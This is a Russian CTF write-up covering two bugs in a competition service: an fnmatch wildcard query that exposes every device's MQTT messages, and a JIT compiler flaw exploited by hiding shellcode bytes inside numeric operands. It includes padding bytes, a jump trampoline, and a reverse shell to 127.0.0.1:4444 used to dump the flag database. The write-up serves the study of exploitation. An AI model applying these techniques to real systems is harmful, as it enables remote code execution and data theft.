В сервисе **два** флага (один передаётся через MQTT и может быть перехвачен через лёгкую уязвимость №1; сложная же уязвимость открывает путь к обоим флагам, т.к. является RCE).

## Уязвимость №1 (лёгкая)
### exploit: `1-fnmatchWildcard.py`
```rust
let topic_cstr = CString::new(publish.topic).unwrap();
let pattern_cstr = CString::new(format!("/kube_comms/{}", kube_filter)).unwrap();

let match_result = unsafe { fnmatch(pattern_cstr.as_ptr() as *const c_char, topic_cstr.as_ptr() as *const c_char, 0) };

if match_result == 0 { (опубликовать сообщение в данный канал) }
```
fnmatch позволяет передать не только точную строку для сравнения, но и шаблон, например * (эта функциональность используется в шеллах для подстановки через wildcards (cat file*.txt - выведет file1.txt, file1298121.txt и т.д.)  
Таким образом, можно просматривать сообщения не только для устройств с известным ID, но для всех вообще: `http://IP:3000/api/client/receive?kube=*`  
Фиксится тем, что убираем fnmatch и сравниваем "простым" сравнением.

### Уязвимость №2 (сложная)
### exploit: `2-sploit-127001_port_4444.txt`, генератор кода - `2-minijitRCE.py`, а также см. папку `tools-for-2nd-exploit`
Уязвим minijit:
```asm
load_r1 9
load_r2 7
add
```
Когда запускаем программы как выше, то всё вроде бы нормально. Получаем 16.
Разберём ход построения машинного кода. Код выше "скомпилируется" в:
`48C7C00900000048C7C3070000004801D8909090909090.(и так кучу раз по 90).909090C3` (для этого даже есть специальная функциональность, надо собрать minijit, как написано в `building.txt`: 
`cargo build --features debug_print_memory`  
Листинг:
```asm
0:  48 c7 c0 09 00 00 00    mov    rax,0x9
7:  48 c7 c3 07 00 00 00    mov    rbx,0x7
e:  48 01 d8                add    rax,rbx
11: 90                      nop
12: 90                      nop
13: 90                      nop
14: 90                      nop
15: 90                      nop
16: 90                      nop
(..... и т.д. куча 90 nop .....)
xx: c3                      ret
```
Переходим непосредственно к уязвимости. Опкод mov `48 c7 c0/c3` подразумевает 4-байтовый операнд, однако по логике работы "компилятора" можно передать до 8 байт:
```asm
load_r1 99999999999
```
Результат будет такой: `Illegal instruction (core dumped)`.
То есть пытается выполнить дальнейшие инструкции (т.е. ту часть числа, которая вылезла за 4 байта, но естественно это не является какими-то валидными инструкциями).  
Исправим:
```asm
load_r1 18224819265520865553
```
Здесь я вставил валидные инструкции в само число: `hex(18224819265520865553) = 0xfceb909011111111; 9090EBFC: nop; nop; jmp $-2`  
Результат: бесконечный цикл (jmp `$-2` - IP-relative jump, прыгает опять на nop-ы).

Но если выполнить:
```asm
load_r1 18224819265520865553
load_r1 1
```
Ничего подозрительного не произойдет (выведется ответ: 1).
Посмотрим на память перед выполнением: `48C7C01111111148C7C001000000`
То есть, `11111111` записались как 4 байта, а далее нужные инструкции перетёрлисть `48C7C0` (mov опкодом следующей инструкции).

Вывод: "выйти за границу" получится только на последней инструкции, а далее прыгаем в начало и выполняем другие инструкции, которые закодированы в 4-байтных "нормальных" числах. Проблема ещё в том, что необходимо что-либо сделать с `mov`, иначе программа снова пойдет по предусмотренному пути.  
### Начну разбирать своё решение.
`tools-for-2nd-exploit/run_shellcode.py` - самый главный файл, основывается на шеллкоде для реверс-шелла с ресурса https://shell-storm.org/shellcode/files/shellcode-907.html  
Для начала я переместил загрузку длинных чисел:
```asm
mov rcx, 0x68732f2f6e69622f     ; /bin//sh
"   mov rcx, " + address +         ";" +    # Socket address and port

```
Переместил в начало кода (гружу и забрасываю на стек). Таким образом, после загрузки остаются ТОЛЬКО те инструкции, которые кодируются в 2 байта или 1 (neg, кодирующуюся в 3, можно вообще убрать и предрассчитать результат).   
Зачем это всё нужно? Дело в том, что полезные инструкции будут разбросаны между mov-инструкциями (т.к. шеллкод грузится в качестве чисел: `load_r1 ЧИСЛО`, и `load_r1`, которая на самом деле `mov`, мешается).
Теперь рассмотрим заполнители:
```python
LEFT3 = ".byte 0xf6; .byte 0x48; .byte 0xc7; .byte 0xc0" # but REQUIRES rax unchanged!! (test   BYTE PTR [rax-0x39],0xc0)
LEFT2 = ".byte 0x3d; .byte 0x00; .byte 0x48; .byte 0xc7; .byte 0xc0" # no constraint (cmp    eax,0xc0c74800)
LEFT2_SPECIAL = ".byte 0x68; .byte 0x2b; .byte 0x48; .byte 0xc7; .byte 0xc0" # pushes junk to stack
```
Дописываем байт или 2 в начало 0x48 0xc7 0xc0 (mov) и получается ДРУГАЯ инструкция (которая не забирает операнд, стоящий дальше, т.е. наше число из `load_r1 ЧИСЛО`, таким образом закодированные в числе инструкции смогут выполниться!).  
`LEFT3` опаснее (но оверхед всего +1 байт, а не 2, и соотв-но можно выполнять 3х байтовые инструкции шеллкода), т.к. требует определённого значения rax (чтобы была доступна память по адресу `rax-0x39`, поэтому используется в начале при загрузке больших чисел, далее практически везде используется `LEFT2`, но она к сожалению портит регистр флагов и испортит тогда прыжок цикла `jnz dup2_loop;`. Поэтому именно в том месте используется `LEFT2_SPECIAL` - `push 0xffffffffc0c7482b`, затем это мусорное значение убирается после выхода из цикла.  
Все инструкции для "набивки" были подобраны скриптами `tools-for-2nd-exploit/bruteforce*.py`.

Далее на последних 8 байтах, где и есть единственная возможность начать выполнение произвольного кода, происходит следующее (`last = str(struct.unpack('<Q', bytes.fromhex("e9 5e fe ff ff c9 eb f8"))[0])`):
```asm
0:  e9 5e fe ff ff          jmp    $-413
5:  c9                      leave
6:  eb f8                   jmp    $-6
```
Не забываем, что первые 4 байта пойдут в число, а выполнение начнётся только последних 4-х:
```asm
0:  ff c9                   dec    ecx
2:  eb f8                   jmp    $-6
```
`dec    ecx` - снова "набивка", т.к. главный jump на IP-413 занимает 5 байт, а не 4, поэтому выполняется "набивка" `dec    ecx`, затем `jmp    $-6` прыгает на `jmp    $-413`, после чего уже отправляемся в шеллкод.
Для тестирования можете запустить `tools-for-2nd-exploit/run_shellcode.py` и поймать шелл на `127.0.0.1:4444`, также можно отправить сообщение из `2-sploit-127001_port_4444.txt` серверу, но listener нужно поднимать **ВНУТРИ** docker контейнера с приложением (либо заменить IP в шеллкоде).
Получив reverse shell, остаётся лишь слить `/appdir/flags_db` и получить все флаги.
